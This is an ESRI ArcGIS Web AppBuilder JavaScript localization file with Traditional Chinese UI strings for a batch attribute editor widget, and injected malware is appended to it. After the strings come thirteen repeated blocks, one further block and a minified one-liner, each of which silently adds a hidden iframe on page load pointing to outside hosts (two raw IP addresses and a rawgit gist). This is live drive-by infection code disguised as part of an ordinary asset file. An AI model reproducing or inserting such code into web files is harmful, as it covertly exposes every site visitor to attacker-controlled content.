// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/BatchAttributeEditor/setting/nls/strings":{page1:{selectToolHeader:"\u9078\u64c7\u6279\u6b21\u66f4\u65b0\u8a18\u9304\u7684\u65b9\u6cd5\u3002",selectToolDesc:"Widget \u652f\u63f4\u7522\u751f\u4e00\u7d44\u9078\u53d6\u66f4\u65b0\u8a18\u9304\u7684 3 \u7a2e\u65b9\u6cd5\u3002\u53ea\u80fd\u9078\u64c7\u5176\u4e2d\u4e00\u7a2e\u65b9\u6cd5\u3002\u82e5\u60a8\u9700\u8981\u4e00\u7a2e\u4ee5\u4e0a\u7684\u9019\u4e9b\u65b9\u6cd5\uff0c\u8acb\u5efa\u7acb Widget \u7684\u65b0\u57f7\u884c\u500b\u9ad4\u3002",
selectByShape:"\u6309\u5340\u57df\u9078\u64c7",selectBySpatQuery:"\u6309\u5716\u5fb5\u9078\u64c7",selectByAttQuery:"\u6309\u5716\u5fb5\u8207\u76f8\u95dc\u5716\u5fb5\u9078\u64c7",selectByQuery:"\u6309\u67e5\u8a62\u9078\u64c7",toolNotSelected:"\u8acb\u9078\u64c7\u4e00\u500b\u9078\u64c7\u65b9\u6cd5"},page2:{layersToolHeader:"\u9078\u64c7\u8981\u66f4\u65b0\u7684\u5716\u5c64\u53ca\u9078\u64c7\u5de5\u5177\u9078\u9805 (\u82e5\u6709\u7684\u8a71)\u3002",layersToolDesc:"\u60a8\u5728\u7b2c\u4e00\u9801\u6311\u9078\u7684\u9078\u64c7\u65b9\u6cd5\u5c07\u7528\u4f86\u9078\u64c7\u548c\u66f4\u65b0\u4e0b\u5217\u5716\u5c64\u96c6\u3002\u5982\u679c\u60a8\u52fe\u9078\u591a\u500b\u5716\u5c64\uff0c\u5247\u53ea\u80fd\u66f4\u65b0\u4e00\u822c\u7684\u53ef\u7de8\u8f2f\u6b04\u4f4d\u3002\u4f9d\u64da\u60a8\u9078\u64c7\u7684\u9078\u64c7\u5de5\u5177\uff0c\u5c07\u9700\u8981\u5176\u4ed6\u9078\u9805\u3002",
layerTable:{colUpdate:"\u66f4\u65b0",colLabel:"\u5716\u5c64(L)",colSelectByLayer:"\u6309\u5716\u5c64\u9078\u64c7",colSelectByField:"\u67e5\u8a62\u6b04\u4f4d",colhighlightSymbol:"\u7a81\u986f\u7b26\u865f"},toggleLayers:"\u5207\u63db\u5716\u5c64\u7684\u53ef\u898b\u5ea6\u958b\u95dc",noEditableLayers:"\u7121\u53ef\u7de8\u8f2f\u7684\u5716\u5c64",noLayersSelected:"\u5148\u9078\u64c7\u4e00\u6216\u591a\u500b\u5716\u5c64\u518d\u7e7c\u7e8c\u3002"},page3:{commonFieldsHeader:"\u9078\u64c7\u8981\u6279\u6b21\u66f4\u65b0\u7684\u6b04\u4f4d\u3002",
commonFieldsDesc:"\u4e0b\u5217\u53ea\u6703\u986f\u793a\u4e00\u822c\u7684\u53ef\u7de8\u8f2f\u6b04\u4f4d\u3002\u8acb\u9078\u64c7\u8981\u66f4\u65b0\u7684\u6b04\u4f4d\u3002\u5982\u679c\u4f86\u81ea\u4e0d\u540c\u5716\u5c64\u7684\u76f8\u540c\u6b04\u4f4d\u5177\u6709\u4e0d\u540c\u7684\u7db2\u57df\uff0c\u53ea\u6703\u986f\u793a\u548c\u4f7f\u7528\u4e00\u500b\u7db2\u57df\u3002",noCommonFields:"\u7121\u4e00\u822c\u6b04\u4f4d",fieldTable:{colEdit:"\u53ef\u7de8\u8f2f",colName:"\u540d\u7a31",colAlias:"\u5225\u540d",
colAction:"\u64cd\u4f5c"}},tabs:{selection:"\u5b9a\u7fa9\u9078\u64c7\u985e\u578b",layers:"\u5b9a\u7fa9\u8981\u66f4\u65b0\u7684\u5716\u5c64",fields:"\u5b9a\u7fa9\u8981\u66f4\u65b0\u7684\u6b04\u4f4d"},errorOnOk:"\u8acb\u5148\u586b\u5beb\u6240\u6709\u53c3\u6578\u518d\u5132\u5b58\u914d\u7f6e",next:"\u4e0b\u4e00\u9801",back:"\u8fd4\u56de",save:"\u5132\u5b58\u7b26\u865f",cancel:"\u53d6\u6d88",ok:"\u78ba\u5b9a",symbolPopup:"\u7b26\u865f\u9078\u64c7\u5668",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});